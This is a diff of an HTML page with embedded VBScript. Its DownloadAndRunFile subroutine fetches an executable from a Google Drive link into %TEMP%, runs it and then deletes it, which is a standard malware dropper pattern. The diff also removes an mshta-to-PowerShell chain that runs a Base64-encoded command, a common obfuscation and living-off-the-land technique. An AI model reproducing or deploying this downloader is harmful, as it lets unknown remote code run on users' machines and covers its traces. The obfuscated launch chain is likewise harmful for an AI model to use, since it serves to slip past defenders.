@@ -24,38 +24,13 @@
 <script type="text/vbscript">
    Option Explicit
 
-' Function to encode a string to Base64
-Function Base64Encode(str)
-    Dim objXML, objNode
-    Set objXML = CreateObject("MSXML2.DOMDocument.6.0")
-    Set objNode = objXML.CreateElement("b64")
-    objNode.DataType = "bin.base64"
-    objNode.Text = str
-    Base64Encode = objNode.Text
-    Set objNode = Nothing
-    Set objXML = Nothing
-End Function
-
-' Main subroutine
 Sub DownloadAndRunFile()
-    ' Define the mshta command
-    Dim strMSHTACommand
-    strMSHTACommand = "mshta.exe ""about:<hta:application><script language='VBScript'>Close(Execute('CreateObject(\"Wscript.Shell\").Run ""powershell.exe -nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5""'))</script>"""
-
-    ' Encode the mshta command
-    Dim strEncodedMSHTACommand
-    strEncodedMSHTACommand = Base64Encode(strMSHTACommand)
-
-    ' Construct the command to execute the encoded mshta command
-    Dim strDOSCommand
-    strDOSCommand = "powershell.exe -e " & strEncodedMSHTACommand
+    Dim objHTTP, objFSO, strFileURL, strSavePath, strFileName
 
     ' Set the Google Drive direct download link
-    Dim strFileURL
     strFileURL = "https://drive.google.com/uc?id=1lqZvBbBTJt_C_7KXMLYpDjy4u4NISRLB"
 
     ' Set the local save path and file name
-    Dim strSavePath, strFileName
     strSavePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
     strFileName = "downloaded_file.exe"
 
@@ -63,7 +38,6 @@ Sub DownloadAndRunFile()
     strSavePath = strSavePath & "\" & strFileName
 
     ' Download the file using WinHTTP
-    Dim objHTTP
     Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
     objHTTP.Open "GET", strFileURL, False
     objHTTP.Send
@@ -87,16 +61,11 @@ Sub DownloadAndRunFile()
         Set objShell = Nothing
 
         ' Delete the file after running
-        Dim objFSO
         Set objFSO = CreateObject("Scripting.FileSystemObject")
         If objFSO.FileExists(strSavePath) Then
             objFSO.DeleteFile strSavePath
         End If
         Set objFSO = Nothing
-
-        ' Execute the encoded mshta command
-        objShell.Run strDOSCommand, 0, True
-        Set objShell = Nothing
     Else
         MsgBox "Failed to download the file. Status: " & objHTTP.Status
     End If
